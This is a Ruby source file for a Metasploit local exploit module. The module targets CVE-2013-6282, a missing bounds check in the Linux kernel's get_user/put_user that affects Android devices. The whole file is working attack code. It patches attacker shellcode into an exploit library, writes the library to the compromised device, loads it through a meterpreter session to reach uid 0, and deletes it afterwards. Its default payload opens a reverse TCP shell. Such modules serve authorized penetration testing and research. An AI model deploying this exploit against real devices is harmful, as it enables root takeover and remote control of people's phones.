##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'           => "Android get_user/put_user Exploit",
        'Description'    => %q{
            This module exploits a missing check in the get_user and put_user API functions
            in the linux kernel before 3.5.5. The missing checks on these functions
            allow an unprivileged user to read and write kernel memory.
                This exploit first reads the kernel memory to identify the commit_creds and
            ptmx_fops address, then uses the write primitive to execute shellcode as uid 0.
            The exploit was first discovered in the wild in the vroot rooting application.
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'fi01',        # libget_user_exploit / libput_user_exploit
          'cubeundcube', # kallsyms_in_memory
          'timwr',       # Metasploit module
        ],
        'References'     =>
        [
          [ 'CVE', '2013-6282' ],
          [ 'URL', 'http://forum.xda-developers.com/showthread.php?t=2434453' ],
          [ 'URL', 'https://github.com/fi01/libget_user_exploit' ],
          [ 'URL', 'http://forum.xda-developers.com/showthread.php?t=2565758' ],
        ],
        'DisclosureDate' => "Sep 06 2013",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        'Targets'        => [[ 'Automatic', { }]],
        'Payload'        => { 'Space'    => 2048, },
        'DefaultOptions' =>
        {
          'WfsDelay'     => 120,
          'PAYLOAD'      => 'linux/armle/mettle/reverse_tcp',
        },
        'DefaultTarget' => 0,
      }
    ))
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2013-6282.so" )
    exploit_data = File.read(local_file, {:mode => 'rb'})

    space = payload_space
    payload_encoded = payload.encoded

    # Substitute the exploit shellcode with our own
    exploit_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))

    workingdir = session.fs.dir.getwd
    remote_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(remote_file, exploit_data)

    print_status("Loading exploit library #{remote_file}")
    session.core.load_library(
        'LibraryFilePath' => local_file,
        'TargetFilePath'  => remote_file,
        'UploadLibrary'   => false,
        'Extension'       => false,
        'SaveToDisk'      => false
    )
    print_status("Loaded library #{remote_file}, deleting")
    session.fs.file.rm(remote_file)
    print_status("Waiting #{datastore['WfsDelay']} seconds for payload")
  end

end